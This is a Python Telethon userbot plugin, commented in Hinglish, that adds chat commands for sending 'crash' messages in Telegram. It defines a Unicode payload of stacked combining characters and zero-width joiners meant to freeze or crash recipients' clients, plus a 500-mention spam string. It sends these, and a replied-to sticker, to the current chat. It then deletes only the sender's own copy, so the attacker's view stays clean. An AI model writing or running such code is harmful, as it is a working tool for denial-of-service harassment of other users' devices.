import asyncio
import os
from telethon import events, functions, types
from telethon.errors import MessageTooLongError

# --- OPTIMIZED DEADLY PAYLOADS (Under 4096 Limit) ---
# Itna bada rakha hai ki crash kare, par error na aaye
KILL_PAYLOAD = "జ్ఞా" * 400 + " 𑪶" * 400 + " \u0e47" * 500 + " \u17b5" * 400 + "‌" * 2000
MENTION_BOMB = "@admin " * 500 # 500 mentions rendering freeze karne ke liye sakt hain

async def setup(client):
    async def send_and_ghost(event, text=None, sticker=None):
        chat = event.chat_id
        try:
            # Direct API call to avoid local rendering as much as possible
            if sticker:
                msg = await event.client.send_file(chat, sticker, caption=None)
            else:
                msg = await event.client.send_message(chat, text, parse_mode=None)
            
            # TURANT apne liye delete (revoke=False)
            await event.client(functions.messages.DeleteMessagesRequest(
                id=[msg.id],
                revoke=False 
            ))
            # Saved messages mein chhota confirmation
            await event.client.send_message("me", f"✅ **Bug Sent in {chat}**")
        except MessageTooLongError:
            await event.client.send_message("me", "❌ **Error:** Payload too big, reducing size...")
        except Exception as e:
            await event.client.send_message("me", f"❌ **Error:** `{str(e)}`")

    @client.on(events.NewMessage(pattern=r"\.crashtxt$", outgoing=True))
    async def txt_bug(event):
        # Pehle hi edit kar do taaki heavy text screen pe na aaye
        await event.edit("📩 `Processing Text Bug...`")
        await send_and_ghost(event, text=KILL_PAYLOAD)
        await event.delete()

    @client.on(events.NewMessage(pattern=r"\.crashment$", outgoing=True))
    async def ment_bug(event):
        await event.edit("📩 `Processing Mentions...`")
        await send_and_ghost(event, text=MENTION_BOMB)
        await event.delete()

    @client.on(events.NewMessage(pattern=r"\.crashstick$", outgoing=True))
    async def stick_bug(event):
        reply = await event.get_reply_message()
        if not reply or not reply.sticker:
            return await event.edit("`Reply to a sticker!`")
        await event.edit("📩 `Processing Sticker Bug...`")
        # Ek hi bar bhejenge par ghost mode mein
        await send_and_ghost(event, sticker=reply.sticker)
        await event.delete()

    @client.on(events.NewMessage(pattern=r"\.crashkill$", outgoing=True))
    async def kill_bug(event):
        reply = await event.get_reply_message()
        await event.edit("☢️ **NUCLEAR STRIKE START...**")
        
        await send_and_ghost(event, text=KILL_PAYLOAD)
        await asyncio.sleep(0.5) # Chhota gap taaki server block na kare
        await send_and_ghost(event, text=MENTION_BOMB)
        
        if reply and reply.sticker:
            await send_and_ghost(event, sticker=reply.sticker)
        
        await event.edit("✅ **Strike Done. Chat cleaned.**")
        await asyncio.sleep(1)
        await event.delete()
        
